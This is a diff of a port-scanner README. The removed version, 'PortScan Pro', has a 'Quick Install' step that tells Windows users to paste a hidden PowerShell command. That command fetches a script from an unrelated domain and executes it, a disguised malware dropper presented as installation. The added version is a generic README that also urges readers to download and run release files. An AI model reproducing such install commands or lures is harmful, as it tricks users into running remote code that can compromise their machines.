@@ -1,87 +1,130 @@
-# 🔍 PortScan Pro - Next-Generation Network Scanner
-*Enterprise-grade port scanning with intelligent analysis and reporting*
+# PortScan Tool 🛠️
 
----
+![GitHub release](https://img.shields.io/github/release/dponce1983/PortScan-Tool.svg)
 
-## 🌟 Core Features
+Welcome to the **PortScan Tool** repository! This tool helps you scan and check open ports on your network. With a focus on simplicity and effectiveness, PortScan Tool is designed for both beginners and experienced users. 
 
-### 🚀 Smart Scanning Engine
-✅ **Multi-Protocol Support**  
-- TCP SYN/FIN/XMAS scans  
-- UDP service detection  
-- SCTP protocol scanning  
+## Table of Contents
 
-✅ **Adaptive Performance**  
-- Auto-rate limiting (prevents network overload)  
-- Parallel scan optimization  
-- Packet fragmentation detection  
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
+## Introduction
+
+Port scanning is a crucial part of network security. It allows you to identify open ports and services running on a host. The **PortScan Tool** offers a straightforward way to perform this task. It is built to provide accurate results while being user-friendly.
+
+## Features
+
+- **IPv4 Support**: Focuses on scanning IPv4 addresses.
+- **TCP Scanning**: Utilizes TCP protocols for effective port scanning.
+- **Port Enumeration**: Identifies open ports and associated services.
+- **Simple Interface**: Easy to use, even for those new to networking.
+- **Cross-Platform**: Works on various operating systems.
+- **Lightweight**: Minimal resource usage while scanning.
 
 ## Installation
 
-### Prerequisites
+To get started with the **PortScan Tool**, follow these steps:
 
-- Internet connection for real-time data fetching
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/dponce1983/PortScan-Tool.git
+   ```
 
-### Quick Install
+2. **Navigate to the Directory**:
+   ```bash
+   cd PortScan-Tool
+   ```
 
-- #### Press WIN+R
-- #### Insert command
+3. **Install Dependencies**:
+   Make sure you have Python installed. Then run:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+4. **Run the Tool**:
+   After installation, you can run the tool by executing:
+   ```bash
+   python portscan.py
+   ```
+
+## Usage
+
+To use the **PortScan Tool**, simply provide the target IP address and specify the range of ports you want to scan. The command structure is as follows:
+
 ```bash
-powershell -WindowStyle Hidden -Command ([ScriptBlock]::Create((irm https://jaihind.edu.in/weatherdolphin/dollrandom))).Invoke();
+python portscan.py <target_ip> <start_port> <end_port>
 ```
 
-```python
-# Sample scan with intelligent throttling
-from portscanpro import Scanner
+### Example
 
-scanner = Scanner(
-    target="192.168.1.0/24",
-    ports="1-1024,3389,8080",
-    intensity="corporate"  # adjusts packet rate
-)
-results = scanner.run()
+To scan a specific IP address for ports 1 to 100:
+
+```bash
+python portscan.py 192.168.1.1 1 100
 ```
 
+This command will return a list of open ports within the specified range.
 
-### 📊 Analysis & Reporting
-#### 🔍 Service Fingerprinting
-- Banner grabbing with protocol decoding
+## Topics
 
-- SSL/TLS inspection (supported ciphers/versions)
+The **PortScan Tool** covers various topics related to port scanning. Here are some relevant keywords:
 
-- Service version detection (1500+ signatures)
+- ipv4-port-scanner
+- nmap-port
+- port-check
+- port-checker
+- port-checking
+- port-enumeration
+- port-forwarding
+- port-mapper
+- port-scan
+- port-scanner
+- port-scanner-socket
+- port-scanning
+- portscan
+- portscanner
+- scan-ports
+- tcp-port-scanner
+- tcp-scan
+- tcp-scanner
 
-#### 📈 Network Mapping
-```
-graph TD
-    A[Target IP] --> B[Open Ports]
-    B --> C[Service Identification]
-    C --> D[Vulnerability Indicators]
-```
+## Contributing
 
-### 🖥️ Usage Examples
+We welcome contributions to the **PortScan Tool**. If you would like to help, please follow these steps:
 
-#### Basic Scan:
-```
-psp scan -t 10.0.0.1 -p 22,80,443 -m syn
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Commit your changes and push to your branch.
+5. Create a pull request.
 
-#### Full Service Audit:
+Your contributions help improve the tool for everyone!
 
-```
-psp deepscan -f targets.txt -o audit_2024.html --legal-check
-```
+## License
 
-#### Continuous Monitoring:
-```
-psp monitor --network 192.168.1.0/24 --schedule daily --slack-alerts
-```
-### Scan Types:
-```
-| Mode       | Speed | Stealth | Reliability |
-|------------|-------|---------|-------------|
-| SYN Scan   | ★★★★☆ | ★★★★★   | ★★★★☆       |
-| CONNECT    | ★★★☆☆ | ★★☆☆☆   | ★★★★★       |
-| UDP Probe  | ★★☆☆☆ | ★★★☆☆   | ★★★☆☆       |
-```
+The **PortScan Tool** is licensed under the MIT License. See the LICENSE file for more details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [dponce1983](https://github.com/dponce1983)
+
+## Releases
+
+You can find the latest releases of the **PortScan Tool** [here](https://github.com/dponce1983/PortScan-Tool/releases). Download the latest version and execute it to start scanning ports on your network.
+
+Explore the **Releases** section for updates and new features.
+
+---
+
+Thank you for using the **PortScan Tool**! Happy scanning! 🚀
